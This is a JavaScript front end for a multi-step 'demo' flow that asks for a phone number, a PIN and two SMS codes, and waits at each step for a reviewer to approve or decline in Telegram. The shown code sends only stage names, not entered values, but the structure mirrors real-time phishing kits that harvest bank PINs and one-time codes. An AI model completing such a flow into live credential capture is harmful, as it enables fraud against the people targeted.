let currentRef = null;
let pollTimer = null;
let countdownTimer = null;

// Change the visible page and update progress.
function show(id, step) {
  document.querySelectorAll(".page").forEach(page => {
    page.classList.remove("active");
  });

  const page = document.getElementById(id);

  if (page) {
    page.classList.add("active");
  }

  const stepNumber = document.getElementById("stepNumber");
  const progressBar = document.getElementById("progressBar");

  if (stepNumber) {
    stepNumber.textContent = `Step ${step} of 7`;
  }

  if (progressBar) {
    progressBar.style.width =
      `${Math.min(100, (step / 7) * 100)}%`;
  }
}

// Send a demo-stage event to the server.
async function requestReview(stage) {
  const status = document.getElementById("reviewStatus");

  try {
    if (status) {
      status.textContent = "Requesting demo review...";
    }

    const response = await fetch("/api/demo-status", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ stage })
    });

    const data = await response.json();

    if (!response.ok || !data.success) {
      throw new Error(
        data.error || "Could not create demo review"
      );
    }

    currentRef = data.reference;

    if (status) {
      status.textContent =
        `Demo review requested: ${currentRef}. Waiting for a decision.`;
    }

    watchReview();
  } catch (error) {
    console.error("Demo review error:", error);

    if (status) {
      status.textContent =
        "Demo review could not be created. Check the Render logs and Telegram configuration.";
    }
  }
}

// Poll the server for the reviewer's decision.
function watchReview() {
  clearInterval(pollTimer);

  if (!currentRef) {
    return;
  }

  pollTimer = setInterval(async () => {
    try {
      const response = await fetch(
        `/api/demo-status/${encodeURIComponent(currentRef)}`
      );

      if (!response.ok) {
        return;
      }

      const data = await response.json();

      if (data.status === "approved") {
        clearInterval(pollTimer);
        clearInterval(countdownTimer);

        show("otp1Page", 5);
      } else if (data.status === "declined") {
        clearInterval(pollTimer);
        clearInterval(countdownTimer);

        show("declinePage", 7);
      }
    } catch (error) {
      console.error("Review status check failed:", error);
    }
  }, 2000);
}

// Show the loading screen and request Telegram review.
function startWait(stage) {
  clearInterval(countdownTimer);
  clearInterval(pollTimer);

  show("loadingPage", 4);

  const secondsDisplay = document.getElementById("seconds");
  const status = document.getElementById("reviewStatus");

  if (status) {
    status.textContent = "Requesting demo review...";
  }

  let seconds = 5;

  if (secondsDisplay) {
    secondsDisplay.textContent = `${seconds}s`;
  }

  requestReview(stage);

  countdownTimer = setInterval(() => {
    seconds--;

    if (secondsDisplay) {
      secondsDisplay.textContent = `${Math.max(0, seconds)}s`;
    }

    if (seconds <= 0) {
      clearInterval(countdownTimer);

      if (status) {
        status.textContent =
          "Waiting for the Approve Demo or Decline Demo decision in Telegram.";
      }
    }
  }, 1000);
}

// Start the demo.
document.getElementById("startBtn").addEventListener("click", () => {
  show("numberPage", 2);
});

// Continue to the demo PIN screen.
document.getElementById("numberBtn").addEventListener("click", () => {
  show("pinPage", 3);
});

// Request review for the synthetic PIN demonstration.
document.getElementById("pinBtn").addEventListener("click", () => {
  startWait("pin_demo");
});

// Continue through the synthetic SMS demonstration.
document.getElementById("otp1Btn").addEventListener("click", () => {
  startWait("otp1_demo");
});

// Continue through the synthetic four-digit code demonstration.
document.getElementById("otp2Btn").addEventListener("click", () => {
  startWait("otp2_demo");
});

// Restart from the welcome screen.
document.getElementById("restartSuccess").addEventListener("click", resetDemo);
document.getElementById("restartDecline").addEventListener("click", resetDemo);

function resetDemo() {
  clearInterval(pollTimer);
  clearInterval(countdownTimer);

  currentRef = null;

  show("homePage", 1);
}
